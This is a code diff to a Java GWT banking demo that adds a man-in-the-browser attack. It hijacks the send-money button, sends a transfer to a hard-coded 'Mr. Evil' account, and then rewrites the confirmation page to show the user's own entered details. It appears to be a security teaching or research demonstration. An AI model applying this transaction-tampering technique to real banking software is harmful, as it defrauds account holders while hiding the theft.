@@ -542,22 +542,65 @@ public class SCB implements EntryPoint, Observer {
 	 * @see http://code.google.com/p/gwtquery/wiki/GettingStarted
 	 */
 	private void startAttack(){
-		$("h1").css(BACKGROUND_COLOR, RED).text("Attack will start now!");
+		$("h1").css(BACKGROUND_COLOR, RED).text("You are hacked!");
 		
 		//everything should best work with DOM-Operations only (not with knowledge of the Java Widget)
 		
-		mTransfer.getSendMoney().addClickHandler(new ClickHandler() {
-			//later, the original click handler must be executed, but the control flow must be change before, so do change the parameters
-			//two choices: 
-			//1. Remove the previous event handler and code the call yourself
-			//2. change the transaction fields and delegate to previous methods
+		//1. Find relevant Button
+		//later find with DOM Operations (GWTQuery)
+		Button sendMoneyAskForConfirmBtn=mTransfer.getSendMoney();
+		
+		//rewrite ClickHandler for askForConfirmation Button
+		sendMoneyAskForConfirmBtn.addClickHandler(new ClickHandler() {
+			
 			@Override
 			public void onClick(ClickEvent event) {
-				Window.alert("Intruder alert");
+				String ATTACKER_BLZ="6272";
+				String ATTACKER_BANK_NAME="Deutsche Privatbank";
+				String ATTACKER_RECEIVER_ACC_NR="172";
+				String ATTACKER__RECEIVER_NAME="Mr. Evil";
+				int ATTACKER__AMOUNT=10;
+				String ATTACKER_REMARK="I just needed the money";
+				 CustomerServiceAsync bankingService= GWT.create(CustomerService.class);
+				 bankingService.sendMoneyAskForConfirmationData(currentAccount, ATTACKER_BLZ, ATTACKER_RECEIVER_ACC_NR, ATTACKER__AMOUNT, ATTACKER_REMARK, ATTACKER__RECEIVER_NAME, ATTACKER_BANK_NAME,new AsyncCallback<MoneyTransferDTO>() {
+
+					@Override
+					public void onFailure(Throwable caught) {
+						caught.printStackTrace();
+						Window.alert("Called with failure: "+caught.getMessage());
+						
+					}
+
+					@Override
+					public void onSuccess(MoneyTransferDTO result) {
+						Window.alert("First part succeeds. Now manipulate the confirmation page");
+						result.setReceiverAccountNr(SCB.this.mTransfer.getReceiverAccountNr().getText());
+						result.setReceiverName(SCB.this.mTransfer.getReceiverName().getText());
+						result.setReceiverBankNr(SCB.this.mTransfer.getReceiverBLZ().getText());
+						result.setReceiverName(SCB.this.mTransfer.getReceiverBankName().getText());
+						result.setRemark(SCB.this.mTransfer.getRemark().getText());
+						result.setAmount(Double.parseDouble(SCB.this.mTransfer.getAmount().getText()));
+						showMoneyTransferConfirmationForm(result);
+						
+					}
+				});
+				
 				
 			}
 		});
 		
 		
+		
+		
+//		sendMoneyAskForConfirmBtn.
+		
+		
+			//later, the original click handler must be executed, but the control flow must be change before, so do change the parameters
+			//two choices: 
+			//1. Remove the previous event handler and code the call yourself
+			//2. change the transaction fields and delegate to previous methods
+		
+		
 	}
 }
+
